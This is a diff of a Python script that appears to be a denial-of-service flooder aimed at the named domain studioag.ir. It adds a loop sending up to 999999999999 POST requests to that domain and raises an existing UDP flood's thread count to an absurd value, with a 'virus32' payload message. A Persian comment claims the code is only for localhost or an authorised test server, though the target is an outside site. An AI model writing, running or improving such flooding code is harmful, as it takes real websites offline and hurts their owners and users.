@@ -3,9 +3,19 @@ import socket
 import sys
 import _thread
 from flask import Flask, render_template_string
+import requests
 
+URL = "studioag.ir"  # فقط localhost یا سرور تست با مجوز
+TOTAL = 999999999999
+session = requests.Session()  # نگهداری اتصال (keep-alive)
+for i in range(TOTAL):
+    try:
+        r = session.post(URL, json={"id": i})
+        print(i, r.status_code)
+    except Exception as e:
+        print("error", i, e)    
 site = ("studioag.ir")
-thread_count = ("100000000000")
+thread_count = ("9999999999999999999999999999999")
 ip = socket.gethostbyname(site)
 UDP_PORT = 80
 MESSAGE = 'virus32'
